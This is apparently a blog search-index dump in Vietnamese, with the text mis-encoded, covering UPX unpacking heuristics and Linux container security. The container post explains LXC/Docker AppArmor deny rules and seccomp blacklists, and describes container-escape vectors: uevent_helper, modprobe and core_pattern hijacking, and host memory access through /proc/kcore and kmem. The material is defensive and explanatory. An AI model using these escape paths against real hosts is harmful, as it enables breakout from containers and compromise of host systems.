Ä‘oÃ¡n trÆ°á»›c, do Ä‘Ã³ cÃ³ entropy cao hÆ¡n nhiá»u. Do Ä‘Ã³, khi kiá»ƒm tra náº¿u tháº¥y cÃ³ entropy cao thÃ¬ kháº£ nÄƒng dá»¯ liá»‡u nÃ y Ä‘Ã£ Ä‘Æ°á»£c nÃ©n hoáº·c mÃ£ hÃ³a.\nLow number of discernible strings: Trong file khÃ´ng bá»‹ nÃ©n, chÃºng ta sáº½ nháº­n tháº¥y cÃ³ má»™t lÆ°á»£ng nháº¥t Ä‘á»‹nh cÃ¡c chuá»—i cÃ³ thá»ƒ Ä‘á»c Ä‘Æ°á»£c vÃ¬ háº§u háº¿t cÃ¡c á»©ng dá»¥ng (ká»ƒ cáº£ malware) sá»­ dá»¥ng nhá»¯ng protocol Ä‘Æ°á»£c hiá»‡n thá»±c bá»Ÿi ngÃ´n ngá»¯ con ngÆ°á»i. Do Ä‘Ã³, trong má»™t file bÃ¬nh thÆ°á»ng, nhá»¯ng chuá»—i nÃ y nÃªn xuáº¥t hiá»‡n, vÃ  khi tháº¥y nhá»¯ng chuá»—i cÃ³ thá»ƒ Ä‘á»c Ä‘Æ°á»£c á»Ÿ má»™t file quÃ¡ Ã­t hoáº·c khÃ´ng cÃ³, kháº£ nÄƒng cao file nÃ y Ä‘Ã£ bá»‹ nÃ©n hoáº·c bá»‹ mÃ£ hÃ³a.\nSections with RWX privileges: Trong cÃ¡c file bÃ¬nh thÆ°á»ng, má»™t section sáº½ ráº¥t Ã­t khi Ä‘Æ°á»£c cho phÃ©p cáº£ Ä‘á»c vÃ  ghi, vÃ¬ chÃºng ta hiáº¿m khi muá»‘n viáº¿t Ä‘Ã¨ file thá»±c thi trong á»©ng dá»¥ng cá»§a mÃ¬nh. NgoÃ i ra, hiáº¿m khi viáº¿t trá»±c tiáº¿p vÃ o file thá»±c thi trong lÃºc nÃ³ Ä‘ang cháº¡y. Do Ä‘Ã³, khÃ´ng cÃ³ lÃ½ do nÃ o Ä‘á»ƒ section Ä‘Æ°á»£c cáº¥p quyá»n vá»«a ghi vÃ  vá»«a Ä‘á»c ngoáº¡i trá»« packer. Vá»›i packer, dá»¯ liá»‡u sau khi giáº£i nÃ©n sáº½ Ä‘Æ°á»£c ghi vÃ o section rá»“i thá»±c thi.\njmp or call Instructions to registers/strange memory addresses: TrÃªn nhiá»u packers, Ä‘á»‹a chá»‰ tá»›i nÆ¡i dá»¯ liá»‡u Ä‘Ã£ Ä‘Æ°á»£c giáº£i nÃ©n thÆ°á»ng Ä‘Æ°á»£c lÆ°u trÃªn cÃ¡c thanh ghi vÃ  Ä‘á»‹a chá»‰ Ä‘Ã³ thÆ°á»ng náº±m trong má»™t section khÃ¡c, do dÃ³ chÃºng ta sáº½ tháº¥y bÆ°á»›c nÃ y nháº£y ráº¥t xa. CÃ¡c bÆ°á»›c nháº£y xa nhÆ° tháº¿ thÆ°á»ng khÃ´ng phá»• biáº¿n, vÃ¬ táº¥t cáº£ cÃ¡c mÃ£ thá»±c thi trong há»‡ nhá»‹ phÃ¢n thÆ°á»ng Ä‘Æ°á»£c chá»©a trong má»™t section duy nháº¥t. Náº¿u chÃºng ta tháº¥y má»™t lá»‡nh jump / call Ä‘áº¿n má»™t Ä‘á»‹a chá»‰ mÃ :\n1. KhÃ´ng cÃ³ trong section hiá»‡n táº¡i\n2. KhÃ´ng cÃ³ trong khÃ´ng gian Ä‘á»‹a chá»‰ cá»§a má»™t thÆ° viá»‡n Ä‘Ã£ táº£i.\nthÃ¬ kháº£ nÄƒng cao bÆ°á»›c nháº£y nÃ y lÃ  bÆ°á»›c giáº£i nÃ©n.\nNháº­n diá»‡n vá»›i file Ä‘Æ°á»£c mÃ£ hÃ³a báº±ng UPX CÃ¡c bÆ°á»›c giÃºp chÃºng ta nháº­n diá»‡n vÃ  giáº£i nÃ©n file bá»‹ mÃ£ hÃ³a báº±ng UPX:\nKiá»ƒm tra PE header vÃ  xÃ¡c Ä‘á»‹nh xem chÃºng cÃ³ thá»±c sá»± bá»‹ Ä‘Ã³ng gÃ³i khÃ´ng. Tuy nhiÃªn bÆ°á»›c xÃ¡c Ä‘á»‹nh nÃ y chÃºng ta cÃ³ thá»ƒ dÃ¹ng peid. TÃ¬m nÆ¡i giáº£i nÃ©n sáº½ Ä‘Æ°á»£c ghi. TÃ¬m kiáº¿m lá»‡nh jmp hoáº·c call tham chiáº¿u Ä‘áº¿n má»™t thanh ghi hoáº·c khÃ´ng gian bá»™ nhá»› nÆ¡i lÆ°u dá»¯ liá»‡u giáº£i nÃ©n cÃ³ thá»ƒ Ä‘Æ°á»£c ghi vÃ o trong mÃ£ gá»‘c. Äáº·t breakpoint á»Ÿ nhá»¯ng lá»‡nh nÃ y. Dump data chá»©a trong khÃ´ng gian bá»™ nhá»› Ä‘Ã³, sá»­a import resolutions vÃ  xuáº¥t nÃ³ dÆ°á»›i dáº¡ng tá»‡p thá»±c thi má»›i. Ãp dá»¥ng. Ta Ã¡p dá»¥ng vá»›i bÃ i garbage cá»§a flareon-2020.\n","description":"Packer lÃ  má»™t chÆ°Æ¡ng trÃ¬nh dÃ¹ng Ä‘á»ƒ nÃ©n vÃ  che dáº¥u file thá»±c thi cá»§a mÃ¬nh. NÃ³ Ä‘Æ°á»£c sá»­ dá»¥ng nháº±m giÃºp cÃ¡c developer giáº¥u Ä‘i file thá»±c thi cá»§a mÃ¬nh, Ä‘á»ƒ lÃ m khÃ³ cÃ¡c reverser khiáº¿n há» khÃ³ khÄƒn trong quÃ¡ trÃ¬nh báº» khÃ³a chÆ°Æ¡ng trÃ¬nh cá»§a mÃ¬nh. Tuy nhiÃªn á»©ng dá»¥ng cÅ©ng nhÆ° kÄ© thuáº­t nÃ y cÅ©ng Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ táº¡o ra mÃ£ Ä‘á»™c, vÃ  nÃ³ cÅ©ng gÃ¢y ra nhiá»u khÃ³ khÄƒn cho cÃ¡c nhÃ  phÃ¢n tÃ­ch mÃ£ Ä‘á»™c trong quÃ¡ trÃ¬nh nghiÃªn cá»©u.","id":24,"section":"posts","tags":["Malware, flareon"],"title":"Manually Unpacking UPX Executables (váº«n Ä‘ang update...)","uri":"https://minhlongmt183.github.io/posts/packet/"},{"content":"Container Basics ChÃºng ta sáº½ Ä‘i qua má»™t sá»‘ khÃ¡i niá»‡m cÆ¡ báº£n vÃ  cáº§n thiáº¿t trong docker:\nCredentials Credentials describe the user identity of a task, which determine its permission for shared resources such as files, semaphores, and shared memory.\nCapabilities Since kernel 2.2, Linux divides the privileges associated with superuser into distinct unit known as capabilities\n1 /proc/$PID/status | man capabilities Filesystem The container\u0026rsquo;s root mount is often planted in a container-specialized filesystem, such as OverlayFS\n1 /var/lib/docker/overlay2/..hash../diff Namespaces Má»¥c Ä‘Ã­ch: lÃ m cho há»‡ thá»‘ng container cÃ³ thá»ƒ sá»­ dá»¥ng vÃ  an toÃ n. PID: have their own view of tasks - cung cáº¥p cÃ¢y khÃ´ng gian tÃªn cá»§a process id. NÃ³ cho phÃ©p má»—i container cÃ³ má»™t cÃ¢y Ä‘áº§y Ä‘á»§ cÃ¡c process id riÃªng biá»‡t, trong Ä‘Ã³ init process cÃ³ pid = 1. Process cháº¡y trÃªn host sáº½ cÃ³ pid khÃ¡c vá»›i khi cháº¡y trÃªn container. User: wrap mapping of UID to user - cung cáº¥p phiÃªn báº£n namespace cá»§a User IDs (UIDs) and Group IDs (GIDs). ÄÃ¢y lÃ  má»™t trong nhá»¯ng tÃ­nh nÄƒng quan trá»ng nháº¥t cá»§a há»‡ thá»‘ng container hiá»‡n Ä‘áº¡i vÃ¬ nÃ³ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ cung cáº¥p \u0026ldquo;unprivileged containers\u0026rdquo;. User namespaces cung cáº¥p má»™t trong nhá»¯ng ná»n táº£n cho há»‡ thá»‘ng container trÃªn Linux hiá»‡n nay, vÃ  lÃ  vÃ¹ng cáº¥u hÃ¬nh duy nháº¥t Ä‘Æ°á»£c LXC coi lÃ  an toÃ n. Mount: isolate mount points - cung cáº¥p cháº¿ Ä‘á»™ xem khÃ´ng gian tÃªn cá»§a cÃ¡c Ä‘iá»ƒm káº¿t ná»‘i (mount points). Káº¿t há»£p vá»›i pivot_root syscall, tÃ­nh nÄƒng nÃ y sáº½ cÃ´ láº­p container\u0026rsquo;s filesystem vá»›i host\u0026rsquo;s filesystem. Network: cung cáº¥p khÃ´ng gian tÃªn vÃ  ngÄƒn xáº¿p máº¡ng riÃªng biá»‡t. Háº§u háº¿t cÃ¡c trÆ°á»ng há»£p sá»­ dá»¥ng cá»§a container liÃªn quan tá»›i dá»‹ch vá»¥ máº¡ng, vÃ¬ váº­y nÃ³ Ä‘Æ°á»£c coi lÃ  tÃ­nh nÄƒng lÃµi cá»§a container. UTS: have their own hostname - cung cáº¥p namespaced version cá»§a Ä‘á»‹nh danh há»‡ thá»‘ng (system identifies) IPC: restrict SysV IPC objects Cgroup: isolate the view of cgroups 1 /proc/$PID/ns/ Cgroups CGroups: cung cáº¥p giao diá»‡n phÃ¢n cáº¥p Ä‘á»ƒ quáº£n lÃ­ cÅ©ng nhÆ° Ä‘o lÆ°á»ng tÃ i nguyÃªn vÃ  quyá»n truy cáº­p cá»§a thiáº¿t bá»‹. Cgroups cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng bá»Ÿi cÃ¡c process cÃ³ quyá»n háº¡n cao (higher privileged) Ä‘á»ƒ Ä‘áº·t giá»›i háº¡n vá» sá»­ dá»¥ng bá»™ nhá»›, CPU, cháº·n cÃ¡c thiáº¿t bá»‹ IO khÃ¡c. ChÃºng cÃ²n cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng chung vá»›i iptables Ä‘á»ƒ cung cáº¥p Ä‘á»‹nh hÃ¬nh lÆ°u lÆ°á»£ng. Quan trong nháº¥t, chÃºng Ä‘Æ°á»£c sá»­ dá»¥ng trong há»‡ thá»‘ng container Ä‘áº» kiá»ƒm soÃ¡t quyá»n truy cáº­p cá»§a cÃ¡c thiáº¿t bá»‹.\nLinux Security Modules - LSMs AppArmor and SELinux are Linux security modules providing Mandatory Access Control (MAC), where access rules for a program are described by a profile. AppArmor lÃ  LSM phá»• biáº¿n nháº¥t trong há»‡ thá»‘ng container, nÃ³ cÃ³ thá»ƒ giá»›i háº¡n cÃ¡c hÃ nh Ä‘á»™ng mÃ  má»™t chÆ°Æ¡ng trÃ¬nh nháº¥t Ä‘á»‹nh cÃ³ thá»ƒ thá»±c hiá»‡n, cÅ©ng nhÆ° thá»±c hiá»‡n cÃ¡c hÃ nh Ä‘á»™ng phá»©c táº¡p khi báº¯t Ä‘áº§u process. Cáº£ LXC vÃ  Docker Ä‘á»u thiáº¿t láº­p á»Ÿ cháº¿ Ä‘á»™ máº·c Ä‘á»‹nh Ä‘á»ƒ xÃ¢y dá»±ng nhá»¯ng rÃ o cáº£n an ninh, chá»‘ng láº¡i nhá»¯ng má»‘i Ä‘e dá»a theo chiá»u sÃ¢u. Cho Ä‘áº¿n nay, AppArmor Ä‘Æ°á»£c ghi nháº­n lÃ  há»— trá»£ vÃ  ghi nháº­n tá»‘t nháº¥t.\nDo sá»± Ä‘Æ¡n giáº£n cá»§a cÃº phÃ¡p AppArmor, nÃ³ cÅ©ng dá»… sá»­ dá»¥ng hÆ¡n ráº¥t nhiá»u Ä‘á»ƒ cáº¥u hÃ¬nh tÃ¹y chá»‰nh cho má»—i vÃ¹ng chá»©a. Docker and LXC enable a default LSM profile in enforcement mode, wh mostly serves to restrict a container\u0026rsquo;s\naccess to sensitive /proc and /sys entries. The profile also denies mount syscall. Táº§m quan trá»ng cá»§a Apparmor Mount Options ChÃ­nh sÃ¡ch cá»§a AppArmor cháº·n viá»‡c truy cáº­p Ä‘á»ƒ mounting devpts filesystems. NhÆ° comment á»Ÿ dÆ°á»›i, náº¿u khÃ´ng cÃ³ chÃ­nh sÃ¡ch nÃ y, container cÃ³ thá»ƒ remount /dev/pts vÃ  chiáº¿m quyá»n truy cáº­p vÃ o cÃ¡c thiáº¿t bá»‹ Ä‘áº§u cuá»‘i cá»§a mÃ¡y chá»§. 1 2 3 4 # the container may never be allowed to mount devpts. If it does, it # will remount the host\u0026#39;s devpts. We could allow it to do it with # the newinstance option (but, right now, we don\u0026#39;t). deny mount fstype=devpts CÃ¡c chÃ­nh sÃ¡ch dÃ¹ng Ä‘á»ƒ cháº·n container cá»‘ gáº¯ng remount root filesystem. ChÃ­nh sÃ¡ch nÃ y Ä‘Æ°á»£c thá»±c hiá»‡n nhÆ° má»™t biá»‡n phÃ¡p phÃ²ng thá»§ theo chiá»u sÃ¢u. 1 2 3 # ignore DENIED message on / remount deny mount options=(ro, remount) -\u0026gt; /, deny mount options=(ro, remount, silent) -\u0026gt; /, Utility Changes CÃ³ ráº¥t nhiá»u \u0026ldquo;nÆ¡i nguy hiá»ƒm\u0026rdquo; trong /proc vÃ  /sys cho phÃ©p cÃ¡c container thoÃ¡t ra ngoÃ i (container escapes).\nTáº¥t cáº£ nhá»¯ng Ä‘iá»u nÃ y liÃªn quan tá»›i viá»‡c thay Ä‘á»•i vá»‹ trÃ­ cá»§a má»™t tiá»‡n Ã­ch (cháº³ng háº¡n nhÆ° modprobe) mÃ  mÃ¡y chá»§ sáº½ gá»i khi má»™t sá»± kiá»‡n nháº¥t Ä‘á»‹nh xáº£y ra (vÃ­ dá»¥ nhÆ° yÃªu cáº§u load yÃªu cáº§u cá»§a kernel module).\nBáº±ng cÃ¡ch thay Ä‘á»•i Ä‘iá»u nÃ y Ä‘á»ƒ trá» Ä‘áº¿n má»™t chÆ°Æ¡ng trÃ¬nh bÃªn trong container cá»§a chÃºng ta, attacker sau Ä‘Ã³ cÃ³ thá»ƒ khiáº¿n mÃ¡y chá»§ cháº¡y má»™t Ä‘oáº¡n mÃ£ tÃ¹y Ã½ bÃªn ngoÃ i container\nLXC sá»­ dá»¥ng bá»™ quy táº¯c sau Ä‘á»ƒ cháº·n cÃ¡c cuá»™c táº¥n cÃ´ng nÃ y. LÆ°u Ã½, nÃ³ khÃ´ng pháº£i lÃ  má»™t cáº¥u hÃ¬nh cáº£u AppArmor, nÃ³ lÃ  Ä‘áº§u vÃ o cho má»™t Ä‘oáº¡n lá»‡nh python nhá» táº¡o ra má»™t pháº§n dÃ i (long portion) cá»§a cÃ¡c quy táº¯c AppArmor.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # Run lxc-generate-aa-rules.py on this file after any modification, to generate # the container-rules file which is appended to container-base.in to create the # final abstractions/container-base. block /sys allow /sys/fs/cgroup/** allow /sys/devices/virtual/net/** allow /sys/class/net/** block /proc/sys allow /proc/sys/kernel/shm* allow /proc/sys/kernel/sem* allow /proc/sys/kernel/msg* allow /proc/sys/kernel/hostname allow /proc/sys/kernel/domainname allow /proc/sys/net/** Nhá»¯ng vector quan trá»ng nÃ o Ä‘ang bá»‹ cháº·n?\nuevent_helper: uevents lÃ  nhá»¯ng sá»± kiá»‡n Ä‘Æ°á»£c kernel kÃ­ch hoáº¡t khi má»™t thiáº¿t bá»‹ thÃªm vÃ o hoáº·c xÃ³a Ä‘i. Äiá»u Ä‘Ã¡ng chÃº Ã½ lÃ  Ä‘Æ°á»ng dáº«n cá»§a \u0026ldquo;uevent_helper\u0026rdquo; cÃ³ thá»ƒ Ä‘Æ°á»£c chá»‰nh sá»­a báº±ng cÃ¡ch ghi vÃ o \u0026quot;/sys/kernel/uevent_helper\u0026quot;.\nDo Ä‘Ã³, khi má»™t uevent Ä‘Æ°á»£c kÃ­ch hoáº¡t (cÅ©ng cÃ³ thá»ƒ Ä‘Æ°á»£c thá»±c hiá»‡n tá»« userland báº±ng cÃ¡ch ghi vÃ o cÃ¡c tá»‡p nhÆ° \u0026quot;/sys/class/mem/null/event\u0026quot;), \u0026ldquo;uevent_helper Ä‘á»™c háº¡i\u0026rdquo; sáº½ Ä‘Æ°á»£c thá»±c thi.\nmodprobe: modprobe lÃ  má»™t tiá»‡n Ã­ch thuá»™c userland, Ä‘Æ°á»£c kernel gá»i khi kernel cáº§n load má»™t kernel module. Vá»‹ trÃ­ cá»§a nÃ³ cÃ³ thá»ƒ Ä‘Æ°á»£c thay Ä‘á»•i báº±ng cÃ¡ch sá»­a Ä‘á»•i \u0026quot;/proc/sys/kernel/modprobe\u0026quot;,\nvÃ  sau Ä‘Ã³ chÃºng ta chá»‰ cáº§n thá»±c hiá»‡n má»™t hÃ nh Ä‘á»™ng nÃ o Ä‘Ã³ Ä‘á»ƒ kernel táº£i má»™t kernel module, code chÃºng ta sáº½ Ä‘Æ°á»£c thá»±c thi. (Cháº³ng háº¡n nhÆ° sá»­ dá»¥ng crypto-API Ä‘á»ƒ táº£i crypto-module hoáº·c sá»­ dá»¥ng ifconfig Ä‘á»ƒ táº£i networking module cho thiáº¿t bá»‹ hiá»‡n khÃ´ng sá»­ dá»¥ng.)\ncore_pattern: core_patterns thÆ°á»ng sá»­ dá»¥ng Ä‘á»ƒ cho kernel biáº¿t cÃ¡ch Ä‘áº·t tÃªn vÃ  Ä‘á»‹nh dáº¡ng cÃ¡c core dumps Ä‘Æ°á»£c táº¡o khi chÆ°Æ¡ng trÃ¬nh bá»‹ crash.\nTuy nhiÃªn, nÃ³ láº¡i cÃ³ 1 tÃ­nh nÄƒng ráº¥t tá»‡: \u0026ldquo;tá»« Linux kernel 2.6.19. Linux há»— trá»£ cÃº phÃ¡p thay tháº¿ cho tá»‡p /proc/sys/kernel/core_patterm. Náº¿u kÃ½ tá»± Ä‘áº§u tiÃªn cá»§a tá»‡p nÃ y lÃ  kÃ­ tá»± pipe (|),\nthÃ¬ pháº§n cÃ²n láº¡i cá»§a dÃ²ng nÃ y Ä‘Æ°á»£c hiá»ƒu lÃ  má»™t chÆ°Æ¡ng trÃ¬nh sáº½ Ä‘Æ°á»£c thá»±c thi. Thay vÃ¬ Ä‘Æ°á»£c ghi vÃ o Ä‘Ä©a, core dump lÃºc bÃ¢y giá» sáº½ Ä‘Æ°á»£c xem lÃ  má»™t chuáº©n input cá»§a chÆ°Æ¡ng trÃ¬nh trÃªn.\u0026rdquo;.\nSá»­ dá»¥ng tÃ­nh nÄƒng trÃªn, core_pattern cÃ³ thá»ƒ Ä‘Æ°á»£c chá»‰ Ä‘á»‹nh Ä‘á»ƒ gá»i chÆ°Æ¡ng trÃ¬nh cá»§a chÃºng ta, rá»“i Ä‘á»ƒ kÃ­ch hoáº¡t nÃ³, ta chá»‰ cáº§n lÃ m cho chÆ°Æ¡ng trÃ¬nh bá»‹ crash.\n/proc/sys/vm/panic_on_oom: Ä‘Ã¢y lÃ  global flag, xÃ¡c Ä‘á»‹nh kernel cÃ³ \u0026ldquo;hoáº£ng sá»£\u0026rdquo; (panic) khi gáº·p pháº£i tÃ¬nh tráº¡ng háº¿t bá»™ nhá»› hay khÃ´ng (Out Of Memory - OOM). Äiá»u nÃ y cho phÃ©p chÃºng ta tiáº¿n hÃ nh má»™t cuá»™c táº¥n cÃ´ng DOS Ä‘Æ¡n giáº£n.\nDangerous Paths 1 2 3 4 5 # block some other dangerous paths deny @{PROC}/kcore rwklx, deny @{PROC}/kmem rwklx, deny @{PROC}/mem rwklx, deny @{PROC}/sysrq-trigger rwklx, kcore cung cáº¥p káº¿t xuáº¥t Ä‘áº§y Ä‘á»§ cá»§a bá»™ nhá»› váº­y lÃ­ há»‡ thá»‘ng (full dump of the physical memory) á»Ÿ dáº¡ng core file. NÃ³ khÃ´ng cho phÃ©p ghi vÃ o bá»™ nhá»› Ä‘Ã£ nÃ³i.\nQuyá»n truy vÃ o Ä‘iá»u nÃ y cho phÃ©p container cÃ³ thá»ƒ Ä‘á»c táº¥t cáº£ host memory.\nkmem: \u0026ldquo;/proc/kmem\u0026rdquo; lÃ  má»™t giao diá»‡n thay tháº¿ cho \u0026ldquo;/dev/kmem\u0026rdquo; (quyá»n truy cáº­p trá»±c tiáº¿p bá»‹ cháº·n bá»›i cgroup device whitelist), lÃ  má»™t kÃ­ tá»± Ä‘áº¡i diá»‡n cho kernel virtual memory.\nNÃ³ cho phÃ©p cáº£ Ä‘á»c vÃ  viáº¿t, cho phÃ©p trá»±c tieps sá»­a Ä‘á»•i kernel memory. (NÃ³ Ä‘Ã²i há»i sá»± khÃ©o lÃ©o hÆ¡n má»™t chÃºt so vá»›i kmem, vÃ¬ cÃ¡c Ä‘á»‹a chá»‰ áº£o cáº§n Ä‘Æ°á»£c phÃ¢n giáº£i thÃ nh cÃ¡c Ä‘á»‹a chá»‰ váº­t lÃ­ trÆ°á»›c).\nsysrq-trigger: ghi vÃ o tá»‡p Ä‘áº·c biá»‡t nÃ y cho phÃ©p gá»­i cÃ¡c lá»‡nh khÃ³a yÃªu cáº§u (Request Key commands), cho phÃ©p mÃ´t sá»‘ hÃ nh Ä‘á»™ng Ä‘áº·c quyá»n,\ncháº³ng háº¡n nhÆ° há»§y cÃ¡c quy trÃ¬nh, liá»‡t kÃª táº¥t cáº£ cÃ¡c quy trÃ¬nh trÃªn há»‡ thÃ´ng hoáº·c kÃ­ch hoáº¡t khá»Ÿi Ä‘á»™ng láº¡i mÃ¡y chá»§.\nCÃ¡c khá»‘i quan trá»ng cuá»‘i cÃ¹ng ghi Ä‘áº¿n má»™t sá»‘ nÆ¡i khÃ¡c nhau cÃ³ thá»ƒ nguy hiá»ƒm:\n1 2 3 4 5 6 # deny writes in /sys except for /sys/fs/cgroup, also allow # fusectl, securityfs and debugfs to be mounted there (read-only) deny mount fstype=debugfs -\u0026gt; /var/lib/ureadahead/debugfs/, deny /sys/firmware/efi/efivars/** rwklx, deny /sys/kernel/security/** rwklx, deny @{PROC}/sys/fs/** wklx, debugfs: cung cáº¥p má»™t giao diá»‡n \u0026ldquo;no rules\u0026rdquo; mÃ  kernel (hoáº·c kernel module) cÃ³ thá»ƒ táº¡o ra cÃ¡c giao diá»‡n debug cÃ³ thá»ƒ truy cáº­p vÃ o vÃ¹ng ngÆ°á»i dÃ¹ng (userland).\nNÃ³ Ä‘Ã£ cÃ³ má»™t sá»‘ váº¥n Ä‘á» vá» báº£o máº­t trong quÃ¡ khá»© vÃ  cÃ¡c nguyÃªn táº¯c \u0026ldquo;no rules\u0026rdquo; Ä‘áº±ng sau há»‡ thá»‘ng tá»‡p thÆ°á»ng xung Ä‘á»™t vá»›i cÃ¡c rÃ ng buá»™c báº£o máº­t.\nBÃªn trong má»™t LXC container, nÃ³ Ä‘Æ°á»£c gÃ¡n á»Ÿ cháº¿ Ä‘á»™ chá»‰ Ä‘á»c.\n/sys/firmware/efi/efivars: efivars cung cáº¥p má»™t giao diá»‡n Ä‘á»ƒ viáº¿t vÃ o NVRAM sá»­ dá»¥ng cho cÃ¡c Ä‘á»‘i sá»‘ khá»Ÿi Ä‘á»™ng UEFI (UEFI boot arguments).\nViá»‡c sá»­a Ä‘á»•i chÃºng cÃ³ thá»ƒ khiáº¿n mÃ¡y chá»§ khÃ´ng thá»ƒ khá»Ÿi Ä‘á»™ng Ä‘Æ°á»£c (unbootable).\n/sys/kernel/security: Ä‘Æ°á»£c gÃ¡n á»Ÿ Ä‘Ã¢y lÃ  má»™t giao diá»‡n securityfs, cho phÃ©p cáº¥u hÃ¬nh Linux Security Modules. NÃ³ cho phÃ©p cáº¥u hÃ¬nh chÃ­nh sÃ¡ch cá»§a AppArmor,\nvÃ¬ váº­y, quyá»n truy cáº­p vÃ o Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p má»™t vÃ¹ng chá»©a vÃ´ hiá»‡u hÃ³a há»‡ thá»‘ng MAC cá»§a nÃ³.\n/proc/sys/fs: ThÆ° má»¥c nÃ y chá»©a má»™t máº£ng cÃ¡c options vÃ  thÃ´ng tin liÃªn quan Ä‘áº¿n cÃ¡c khÃ­a cáº¡nh khÃ¡c nhau cá»§a há»‡ thá»‘ng tá»‡p, bao gá»“m: quota, file handle, inode,\nand dentry information. Ghi vÃ o thÆ° má»¥c nÃ y cho phÃ©p cÃ¡c cuá»™c táº¥n cÃ´ng tá»« chá»‘i dá»‹ch vá»¥ khÃ¡c nhau chá»‘ng láº¡i mÃ¡y chá»§.\nseccomp LÃ  cÆ¡ cháº¿ cho system call filtering. ChÃ­nh sÃ¡ch cá»§a policies Ä‘áº¿n tá»« 2 version. Trong version 1, má»™t filter lÃ  má»™t táº­p há»£p nhá» cÃ¡c lá»‡nh gá»i há»‡ thá»‘ng khÃ´ng thá»ƒ tÃ¹y chá»‰nh. Trong version 2, \u0026ldquo;Filter mode\u0026rdquo;, system call filter Ä‘Æ°á»£c viáº¿t nhÆ° chÆ°Æ¡ng trÃ¬nh lá»c gÃ³i Berkeley (Berkeley Packet Filter - BPF). ÄiÃªu\nÄÃ¢y Ä‘Æ°á»£c gá»i lÃ  \u0026ldquo;Strict\u0026rdquo; mode. LXC hiá»‡n táº¡i sá»­ dá»¥ng má»™t chÃ­nh sÃ¡ch khÃ¡ Ä‘Æ¡n giáº£n, trong khi báº£n release 1.10 cá»§a docker Ä‘Æ°á»£c giá»›i thiá»‡u há»— trá»£ cho seccomp-bpf.\nMá»™t Ä‘iá»u lÆ°u Ã½ lÃ  trong Docker 1.10, seccomp khÃ´ng Ä‘Æ°á»£c sá»­ dá»¥ng theo máº·c Ä‘á»‹nh trÃªn trusty (hÆ¡i khÃ³ hiá»ƒu vÃ¬ docker 1.10 trÃªn ubuntu 15.10, seccomp váº«n Ä‘Æ°á»£c sá»­ dá»¥ng máº·c Ä‘á»‹nh).\nTuy nhiÃªn, ká»ƒ tá»« Docker 1.11.1 seccomp hiá»‡n cÅ©ng Ä‘Æ°á»£c sá»­ dá»¥ng theo máº·c Ä‘á»‹nh trÃªn trusty. Táº§m quan trá»ng cá»§a Seccomp Seccomp-BPF cho phÃ©p cáº¥u hÃ¬nh lá»c nhá»¯ng \u0026ldquo;lá»i gá»i há»‡ thá»‘ng nguy hiá»ƒm\u0026rdquo;. Äá»‘i vá»›i má»™t sá»‘ phiÃªn báº£n hiá»‡n nay, LXC Ä‘Ã£ xuáº¥t xÆ°á»Ÿng vá»›i chÃ­nh sÃ¡ch seccomp ráº¥t nhá», Ä‘Æ¡n giáº£n,\nvá»›i minh há»a á»Ÿ dÆ°á»›i. Vá»›i báº£n Docker 1.10, Docker Ä‘Ã£ thÃªm nhiá»u chÃ­nh sÃ¡ch phá»©c táº¡p hÆ¡n.\n1 2 3 4 5 6 7 8 9 2 blacklist reject_force_umount # comment this to allow umount -f; not recommended [all] kexec_load errno 1 open_by_handle_at errno 1 init_module errno 1 finit_module errno 1 delete_module errno 1 Pháº§n Ä‘áº§u cá»§a chÃ­nh sÃ¡ch LXC Ä‘Æ°á»£c sá»­ dá»¥ng nhÆ° má»™t biá»‡n phÃ¡p báº£o vá»‡ chuyÃªn sÃ¢u Ä‘á»ƒ ngÄƒn cháº¡n cÃ¡c vÃ¹ng chá»©a buá»™c pháº£i ummounting cÃ¡c pháº§n cá»§a filesystem.\nKernel Manipulation Má»™t sá»‘ lá»‡nh cho phÃ©p thao tÃ¡c vá»›i kernel module bá»‹ cáº¥m (init_module, finit_module, delete_module), cÅ©ng nhÆ° kexec_load cho phÃ©p thay tháº¿ kernel hiá»‡n táº¡i báº±ng\nmá»™t kernel images má»›i. LÆ°u Ã½, cÃ³ má»™t sá»‘ biá»‡n phÃ¡p báº£o vá»‡ chuyÃªn sÃ¢u chá»‘ng láº¡i viá»‡c khai thÃ¡c chÃºng trong cÃ¡c container Ä‘áº·c quyá»n:\ninit_module, finit_module, delete_module: táº¥t cáº£ yÃªu cáº§u SYS_MODULE capability - Ä‘Ã£ bá»‹ loáº¡i bá» bá»Ÿi Docker vÃ  LXC trong privileged containers. kexec_load khÃ´ng yÃªu cáº§u SYS_MODULE, thay vÃ o Ä‘Ã³ nÃ³ yÃªu cáº§u SYS_BOOT - privileged LXC container giá»¯. Trong háº§u háº¿t cÃ¡c trÆ°á»ng há»£p, Ä‘iá»u nÃ y khÃ´ng thá»ƒ khai thÃ¡c (mÃ  khÃ´ng bypass seccomp),\ntuy nhiÃªn, Ä‘iá»u Ä‘Ã¡ng chÃº Ã½ lÃ  Linux 3.17 Ä‘Ã£ gá»›i hiá»‡u 1 biáº¿n thá»ƒ má»›i cá»§a kexec: kexec_file_load. Lá»‡nh gá»i nÃ y (táº£i signed kernels) khÃ´ng náº±m trong danh sÃ¡ch Ä‘en cá»§a privileged LXC container, vÃ  chá»‰ yÃªu cáº§u SYS_BOOT. Tuy nhiÃªn, vÃ¹ng chá»©a LXC Ä‘áº·c quyá»n cÃ³ má»™t sá»‘ váº¥n Ä‘á» khÃ¡c cho phÃ©p thoÃ¡t khá»i container mÃ  khÃ´ng cáº§n boot vÃ o kernel má»›i (vÃ¬ trÃªn thá»±c táº¿, chÃºng ta cÃ³ thá»ƒ bypass seccomp). The Issue With open_by_handle_at() open_by_handle_at lÃ  má»™t lá»£i gá»i há»‡ thá»‘ng khÃ¡ thÃº vá»‹, ban Ä‘áº§u nÃ³ Ä‘Æ°á»£c Ä‘Æ°a vÃ o kernel Ä‘á»ƒ há»— trá»£ userspace file servers Ä‘á»ƒ cÃ¡c process dá»… dÃ ng chuyá»ƒn cÃ¡c mÃ£ Ä‘á»‹nh danh tá»‡p duy nháº¥t (unique file identifiers) cho nhau.\nTuy nhiÃªn, nÃ³ láº¡i lÃ  má»™t cÆ¡n Ã¡c má»™ng cá»§a báº£o máº­t. Báº¥t kÃ¬ process nÃ o cÃ³ kháº£ nÄƒng DAC_READ_SEARCH Ä‘á»u cÃ³ thá»ƒ sá»­ dá»¥ng open_by_handle_at 